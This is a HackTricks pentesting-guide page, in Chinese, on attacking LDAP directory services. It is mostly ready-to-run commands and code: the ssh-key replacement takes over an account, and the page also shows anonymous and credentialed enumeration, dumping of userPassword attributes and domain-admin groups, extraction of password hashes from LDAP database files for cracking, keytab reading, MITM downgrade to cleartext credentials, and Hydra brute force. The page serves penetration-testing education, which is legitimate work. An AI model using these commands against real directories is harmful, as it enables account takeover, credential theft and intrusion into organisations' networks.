<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>389, 636, 3268, 3269 - Pentesting LDAP</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="389-636-3268-3269---pentesting-ldap"><a class="header" href="#389-636-3268-3269---pentesting-ldap">389, 636, 3268, 3269 - Pentesting LDAP</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<p><strong>LDAP</strong>（轻量级目录访问协议）的主要用途是定位各种实体，如组织、个人以及网络中的资源，如文件和设备，包括公共和私有网络。与其前身 DAP 相比，它提供了一种更简化的方法，代码占用更小。</p>
<p>LDAP 目录的结构允许它们分布在多个服务器上，每个服务器都存储一个<strong>复制</strong>和<strong>同步</strong>的目录版本，称为目录系统代理（DSA）。处理请求的责任完全由 LDAP 服务器承担，必要时可以与其他 DSA 通信，以向请求者提供统一的响应。</p>
<p>LDAP 目录的组织结构类似于<strong>树形层次结构，从根目录开始</strong>。这向下分支到国家，然后进一步划分为组织，再到代表各个部门或单位的组织单位，最终达到包括个人和共享资源（如文件和打印机）在内的个体实体级别。</p>
<p><strong>默认端口：</strong> 389 和 636（ldaps）。全局目录（ActiveDirectory 中的 LDAP）默认在端口 3268 和 3269（LDAPS）上可用。</p>
<pre><code>PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
</code></pre>
<h3 id="ldap-数据交换格式"><a class="header" href="#ldap-数据交换格式">LDAP 数据交换格式</a></h3>
<p>LDIF（LDAP 数据交换格式）将目录内容定义为一组记录。它还可以表示更新请求（添加、修改、删除、重命名）。</p>
<pre><code class="language-bash">dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
</code></pre>
<ul>
<li>第1-3行定义了顶级域local</li>
<li>第5-8行定义了一级域moneycorp (moneycorp.local)</li>
<li>第10-16行定义了2个组织单位：dev和sales</li>
<li>第18-26行创建了一个域对象并分配了带有值的属性</li>
</ul>
<h2 id="写入数据"><a class="header" href="#写入数据">写入数据</a></h2>
<p>请注意，如果您可以修改值，您可能能够执行非常有趣的操作。例如，想象一下您<strong>可以更改您的用户或任何用户的“sshPublicKey”信息</strong>。如果这个属性存在，那么<strong>ssh很可能是从LDAP读取公钥</strong>。如果您可以修改用户的公钥，您<strong>将能够以该用户身份登录，即使在ssh中未启用密码认证</strong>。</p>
<pre><code class="language-bash"># Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
&gt;&gt;&gt; import ldap3
&gt;&gt;&gt; server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
&gt;&gt;&gt; connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
&gt;&gt;&gt; connection.bind()
True
&gt;&gt;&gt; connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
&gt;&gt;&gt; connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
</code></pre>
<h2 id="sniff-clear-text-credentials"><a class="header" href="#sniff-clear-text-credentials">Sniff clear text credentials</a></h2>
<p>如果 LDAP 在没有 SSL 的情况下使用，你可以 <strong>在网络中嗅探明文凭证</strong>。</p>
<p>此外，你可以在 <strong>LDAP 服务器和客户端之间</strong> 执行 <strong>MITM</strong> 攻击。在这里，你可以进行 <strong>降级攻击</strong>，使客户端使用 <strong>明文凭证</strong> 登录。</p>
<p><strong>如果使用 SSL</strong>，你可以尝试像上面提到的那样进行 <strong>MITM</strong>，但提供一个 <strong>虚假证书</strong>，如果 <strong>用户接受它</strong>，你就能够降级认证方法并再次查看凭证。</p>
<h2 id="anonymous-access"><a class="header" href="#anonymous-access">Anonymous Access</a></h2>
<h3 id="bypass-tls-sni-check"><a class="header" href="#bypass-tls-sni-check">Bypass TLS SNI check</a></h3>
<p>根据 <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/"><strong>这篇文章</strong></a>，仅通过使用任意域名（如 company.com）访问 LDAP 服务器，他能够以匿名用户的身份联系 LDAP 服务并提取信息：</p>
<pre><code class="language-bash">ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
</code></pre>
<h3 id="ldap-匿名绑定"><a class="header" href="#ldap-匿名绑定">LDAP 匿名绑定</a></h3>
<p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled">LDAP 匿名绑定</a> 允许 <strong>未认证的攻击者</strong> 从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。这是一种 <strong>遗留配置</strong>，自 Windows Server 2003 起，仅允许经过认证的用户发起 LDAP 请求。<br />
然而，管理员可能需要 <strong>设置特定应用程序以允许匿名绑定</strong>，并给予超过预期的访问权限，从而使未认证用户能够访问 AD 中的所有对象。</p>
<h2 id="有效凭据"><a class="header" href="#有效凭据">有效凭据</a></h2>
<p>如果您拥有有效的凭据登录到 LDAP 服务器，您可以使用以下命令转储有关域管理员的所有信息：</p>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a></p>
<pre><code class="language-bash">pip3 install ldapdomaindump
ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain&gt;\&lt;username&gt;' -p '&lt;password&gt;' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
</code></pre>
<h3 id="暴力破解"><a class="header" href="#暴力破解"><a href="../generic-hacking/brute-force.html#ldap">暴力破解</a></a></h3>
<h2 id="枚举"><a class="header" href="#枚举">枚举</a></h2>
<h3 id="自动化"><a class="header" href="#自动化">自动化</a></h3>
<p>使用此方法，您将能够查看<strong>公共信息</strong>（如域名）<strong>:</strong></p>
<pre><code class="language-bash">nmap -n -sV --script "ldap* and not brute" &lt;IP&gt; #Using anonymous credentials
</code></pre>
<h3 id="python"><a class="header" href="#python">Python</a></h3>
<details>
<summary>查看使用python进行LDAP枚举</summary>
<p>您可以尝试使用python <strong>枚举LDAP，无论是否使用凭据</strong>： <code>pip3 install ldap3</code></p>
<p>首先尝试<strong>不使用</strong>凭据进行<strong>连接</strong>：</p>
<pre><code class="language-bash">&gt;&gt;&gt; import ldap3
&gt;&gt;&gt; server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
&gt;&gt;&gt; connection = ldap3.Connection(server)
&gt;&gt;&gt; connection.bind()
True
&gt;&gt;&gt; server.info
</code></pre>
<p>如果响应为 <code>True</code>，如前面的示例所示，您可以从以下位置获取一些 <strong>有趣的数据</strong>，例如 <strong>命名上下文</strong> 或 <strong>域名</strong> 服务器：</p>
<pre><code class="language-bash">&gt;&gt;&gt; server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
</code></pre>
<p>一旦你拥有命名上下文，你可以进行一些更有趣的查询。这个简单的查询应该会显示目录中的所有对象：</p>
<pre><code class="language-bash">&gt;&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
&gt;&gt; connection.entries
</code></pre>
<p>或<strong>dump</strong>整个ldap：</p>
<pre><code class="language-bash">&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
&gt;&gt;&gt; connection.entries
</code></pre>
</details>
<h3 id="windapsearch"><a class="header" href="#windapsearch">windapsearch</a></h3>
<p><a href="https://github.com/ropnop/windapsearch"><strong>Windapsearch</strong></a> 是一个 Python 脚本，用于通过利用 LDAP 查询从 Windows 域中 <strong>枚举用户、组和计算机</strong>。</p>
<pre><code class="language-bash"># Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
</code></pre>
<h3 id="ldapsearch"><a class="header" href="#ldapsearch">ldapsearch</a></h3>
<p>检查空凭据或您的凭据是否有效：</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '' -w '' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<pre><code class="language-bash"># CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
</code></pre>
<p>如果你发现某些内容说“<em>bind 必须完成</em>”意味着凭据不正确。</p>
<p>你可以使用以下命令从一个域中提取<strong>所有内容</strong>：</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
</code></pre>
<p>提取 <strong>用户</strong>：</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
#Example: ldapsearch -x -H ldap://&lt;IP&gt; -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
</code></pre>
<p>提取 <strong>计算机</strong>：</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>我的信息</strong>：</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>Domain Admins</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>Domain Users</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>Enterprise Admins</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>Administrators</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>提取 <strong>Remote Desktop Group</strong>:</p>
<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b "CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"
</code></pre>
<p>要查看您是否可以访问任何密码，您可以在执行其中一个查询后使用 grep：</p>
<pre><code class="language-bash">&lt;ldapsearchcmd...&gt; | grep -i -A2 -B2 "userpas"
</code></pre>
<p>请注意，您在这里找到的密码可能不是真实的...</p>
<h4 id="pbis"><a class="header" href="#pbis">pbis</a></h4>
<p>您可以从这里下载 <strong>pbis</strong>: <a href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a>，它通常安装在 <code>/opt/pbis</code>。<br />
<strong>Pbis</strong> 允许您轻松获取基本信息：</p>
<pre><code class="language-bash">#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user &lt;username&gt;
./lsa list-groups-for-user &lt;username&gt;
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n &lt;Username&gt; | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n &lt;username&gt; -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
</code></pre>
<h2 id="图形界面"><a class="header" href="#图形界面">图形界面</a></h2>
<h3 id="apache-directory"><a class="header" href="#apache-directory">Apache Directory</a></h3>
<p><a href="https://directory.apache.org/studio/download/download-linux.html"><strong>从这里下载 Apache Directory</strong></a>。你可以在这里找到<a href="https://www.youtube.com/watch?v=VofMBg2VLnw&amp;t=3840s">如何使用这个工具的示例</a>。</p>
<h3 id="jxplorer"><a class="header" href="#jxplorer">jxplorer</a></h3>
<p>你可以在这里下载带有 LDAP 服务器的图形界面：<a href="http://www.jxplorer.org/downloads/users.html">http://www.jxplorer.org/downloads/users.html</a></p>
<p>默认安装在： <em>/opt/jxplorer</em></p>
<p><img src="../.gitbook/assets/image%20(482).png" alt="" /></p>
<h3 id="godap"><a class="header" href="#godap">Godap</a></h3>
<p>Godap 是一个用于 LDAP 的交互式终端用户界面，可以用来与 AD 和其他 LDAP 服务器中的对象和属性进行交互。它适用于 Windows、Linux 和 MacOS，支持简单绑定、pass-the-hash、pass-the-ticket 和 pass-the-cert，以及其他一些专门功能，如搜索/创建/更改/删除对象、从组中添加/移除用户、更改密码、编辑对象权限 (DACLs)、修改 Active-Directory 集成 DNS (ADIDNS)、导出为 JSON 文件等。</p>
<p><img src="../.gitbook/assets/godap.png" alt="" /></p>
<p>你可以在 <a href="https://github.com/Macmod/godap">https://github.com/Macmod/godap</a> 访问它。有关使用示例和说明，请阅读 <a href="https://github.com/Macmod/godap/wiki">Wiki</a>。</p>
<h3 id="ldapx"><a class="header" href="#ldapx">Ldapx</a></h3>
<p>Ldapx 是一个灵活的 LDAP 代理，可以用来检查和转换来自其他工具的 LDAP 流量。它可以用来模糊化 LDAP 流量，以尝试绕过身份保护和 LDAP 监控工具，并实现了在 <a href="https://www.youtube.com/watch?v=mKRS5Iyy7Qo">MaLDAPtive</a> 演讲中提出的大多数方法。</p>
<p><img src="../.gitbook/assets/ldapx.png" alt="" /></p>
<p>你可以从 <a href="https://github.com/Macmod/ldapx">https://github.com/Macmod/ldapx</a> 获取它。</p>
<h2 id="通过-kerberos-进行身份验证"><a class="header" href="#通过-kerberos-进行身份验证">通过 kerberos 进行身份验证</a></h2>
<p>使用 <code>ldapsearch</code> 你可以 <strong>通过 kerberos 进行身份验证</strong>，而不是通过 <strong>NTLM</strong>，使用参数 <code>-Y GSSAPI</code></p>
<h2 id="post"><a class="header" href="#post">POST</a></h2>
<p>如果你可以访问包含数据库的文件（可能在 <em>/var/lib/ldap</em> 中）。你可以使用以下命令提取哈希：</p>
<pre><code class="language-bash">cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
</code></pre>
<p>您可以将密码哈希（从 '{SSHA}' 到 'structural'，不添加 'structural'）提供给 john。</p>
<h3 id="配置文件"><a class="header" href="#配置文件">配置文件</a></h3>
<ul>
<li>一般</li>
<li>containers.ldif</li>
<li>ldap.cfg</li>
<li>ldap.conf</li>
<li>ldap.xml</li>
<li>ldap-config.xml</li>
<li>ldap-realm.xml</li>
<li>slapd.conf</li>
<li>IBM SecureWay V3 服务器</li>
<li>V3.sas.oc</li>
<li>Microsoft Active Directory 服务器</li>
<li>msadClassesAttrs.ldif</li>
<li>Netscape 目录服务器 4</li>
<li>nsslapd.sas_at.conf</li>
<li>nsslapd.sas_oc.conf</li>
<li>OpenLDAP 目录服务器</li>
<li>slapd.sas_at.conf</li>
<li>slapd.sas_oc.conf</li>
<li>Sun ONE 目录服务器 5.1</li>
<li>75sas.ldif</li>
</ul>
<h2 id="hacktricks-自动命令"><a class="header" href="#hacktricks-自动命令">HackTricks 自动命令</a></h2>
<pre><code>Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
</code></pre>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-264-check-point-firewall-1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/ipsec-ike-vpn-pentesting.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-264-check-point-firewall-1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/ipsec-ike-vpn-pentesting.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
